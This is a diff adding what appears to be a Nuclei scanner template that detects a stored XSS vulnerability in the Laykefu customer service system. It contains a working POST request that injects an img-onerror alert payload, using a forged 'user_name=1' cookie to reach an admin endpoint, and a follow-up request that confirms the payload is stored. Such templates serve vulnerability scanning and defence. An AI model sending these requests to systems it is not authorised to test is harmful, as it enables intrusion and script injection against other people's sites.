@@ -1,0 +1,54 @@
+id: laykefu-customer-service-system-xss
+info:
+  name: Laykefu Customer Service System XSS
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: xss
+  description: |
+    Laykefu customer service system XSS vulnerability allows injecting malicious scripts.
+variables:
+  t1: "{{base64(rand_base(5))}}"
+flow: http(1) && http(2)
+http:
+  - id: add-word
+    method: POST
+    path:
+      - "{{BaseURL}}/admin/words/addword.html"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      Cookie: user_name=1
+    body: "content=%3Cimg+src%3Dx+onerror%3Dalert('{{t1}}')%3B%3E&status=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"msg\":\"添加常用语成功\""
+      - type: word
+        part: header
+        words:
+          - "application/json"
+  - id: verify-xss
+    method: GET
+    path:
+      - "{{BaseURL}}/admin/words/index.html?pageNumber=1&pageSize=1000"
+    headers:
+      X-Requested-With: XMLHttpRequest
+      Cookie: user_name=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"content\""
+          - "{{t1}}"
+      - type: word
+        part: header
+        words:
+          - "application/json"
